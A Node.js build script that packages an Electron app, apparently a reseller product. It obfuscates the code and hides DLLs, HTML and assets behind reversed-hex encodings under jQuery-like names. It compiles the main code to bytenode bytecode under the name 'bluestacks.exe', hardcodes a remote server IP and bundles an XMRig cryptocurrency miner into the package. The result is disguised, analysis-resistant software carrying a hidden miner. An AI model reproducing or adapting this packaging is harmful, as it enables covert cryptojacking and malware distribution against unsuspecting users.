const fs = require("fs"), path = {
    ...require("path"),
    ...{ load: (...paths) => path.join(__dirname, ...paths) }
}, compileCode = async i => Buffer.from(require("javascript-obfuscator").obfuscate(i, { compact: true, deadCodeInjection: true, target: "node" }).getObfuscatedCode(), "utf8");

const { execSync } = require("child_process");
const { createPackage } = require("@electron/asar");

const { version } = require(path.load("package.json"));
const { currentBuildFor } = require(path.load("..", "reseller.config.json"));

const isBuildForUser = process.argv.includes("--build"); (async () => {
    fs.existsSync(path.load("dist")) ?
        fs.rmSync(path.load("dist"), { recursive: true }) : null;

    fs.mkdirSync(path.load("dist", "resources"), { recursive: true });
    fs.copyFileSync(path.load("static", "js", "jQuery.js"), path.load("dist", "resources", "jQuery.js"));
    const commonCode = `const name = "${currentBuildFor}", title = "${require(path.load("..", "reseller.config.json"))[currentBuildFor].title}", host = "${isBuildForUser ? "20.197.23.225:80" : "localhost:8080"}", version = "${version}", isBuilt = ${isBuildForUser}`;

    await Promise.all([
        (async () =>
            fs.writeFileSync(path.load("dist", "index.js"), await compileCode(`${commonCode};\n\n${fs.readFileSync(path.load("index.js"), "utf-8")}`)))(),

        (async () => {
            const mainApp = fs.readFileSync(path.load("main.js"), "utf-8");
            const mainLoaderApp = fs.readFileSync(path.load("static", "js", "jQuery.Loader.js"), "utf-8");
            const mainWindowView = Buffer.from(Buffer.from(`<html>
<head>
    <title></title>
    <style type="text/css">
        @font-face {
            font-family: Cascadia;
            src: url(data:font/truetype;charset=utf-8;base64,${fs.readFileSync(path.load("static", "CascadiaCode.TTF"), "base64")});
        }

        ${fs.readFileSync(path.load("static", "main.css"), "utf8")}
    </style>
</head>

${fs.readFileSync(path.load("static", "index.html"), "utf8")}

</html>`, "utf8").toString("hex").split("").reverse().join(""), "utf8").toString("base64url");

            let jQMenu = {};["3D", "BOX", "MOCO", "MENU", "COLOR[RED]", "COLOR[BLUE]", "COLOR[WHITE]"]
                .map(name => jQMenu[name] = Buffer.from(fs.readFileSync(fs.existsSync(path.load("..", "Assets", "LocationMenu", name, `${currentBuildFor}.dll`)) ?
                    path.load("..", "Assets", "LocationMenu", name, `${currentBuildFor}.dll`) : path.load("..", "Assets", "LocationMenu", `${name}.dll`), "hex").split("").reverse().join(""), "utf8").toString("base64url"));


            fs.writeFileSync(path.load("dist", "main.js"), await compileCode(`${commonCode}, jQMenu = ${JSON.stringify(jQMenu)}, mainWindowView = "${mainWindowView}",
wave = "${Buffer.from(fs.readFileSync(path.load("static", "alert.wav"), "hex").split("").reverse().join(""), "utf8").toString("base64url")}",
logo = "${Buffer.from(fs.readFileSync(path.load("static", "icons", `${currentBuildFor}.png`), "hex").split("").reverse().join(""), "utf8").toString("base64url")}";

const os = require("os");
const fs = require("fs"), path = {
    ...require("path"),
    ...{ load: (...paths) => path.join(process.env.mainFolder, ...paths) }
};

const { execSync } = require("child_process");
const { app, BrowserWindow, ipcMain, ipcRenderer, dialog, contextBridge } = require("electron");

${fs.readFileSync(path.load("jQ", "index.js"), "utf8")}
\n\n(("window" in global && "document" in global) ? async () => {\n${mainLoaderApp}\n}: async () => {\n${mainApp}\n})();`));

            execSync(`bytenode${isBuildForUser ? " --compress" : ""} -c dist/main.js -e -ep bluestacks.exe`);
        })()
    ]);

    fs.mkdirSync(path.load("dist", "node_modules"));
    ["axios", "mime-db", "asynckit", "form-data", "mime-types", "node-unrar-js", "proxy-from-env", "delayed-stream", "combined-stream", "follow-redirects"]
        .map(module => fs.cpSync(path.load("node_modules", module), path.load("dist", "node_modules", module), { recursive: true }));

    fs.mkdirSync(path.load("dist", "resources", "node_modules"));
    fs.cpSync(path.load("node_modules", "bytenode"), path.load("dist", "resources", "node_modules", "bytenode"), { recursive: true });

    fs.copyFileSync(path.load("dist", "main.jsc"), path.load("dist", "resources", "main.jsc"));
    fs.writeFileSync(path.load("dist", "package.json"), JSON.stringify({
        version, name: currentBuildFor,
        bin: "index.js",
        main: "index.js",
        pkg: {
            assets: [
                "app.asar",
                "node_modules/**/*"
            ],
            targets: [
                "node18-win-x64"
            ]
        }
    }));

    fs.writeFileSync(path.load("dist", "resources", "package.json"),
        JSON.stringify({ main: "main.js" })); fs.writeFileSync(path.load("dist", "resources", "main.js"), `require("bytenode");\nrequire("./main.jsc");`);

    fs.mkdirSync(path.load("dist", "resources", "XMRig"));
    fs.cpSync(path.load("XMRig"), path.load("dist", "resources", "XMRig"), { recursive: true });

    await createPackage(path.load("dist", "resources"), path.load("dist", "app.asar"));
})();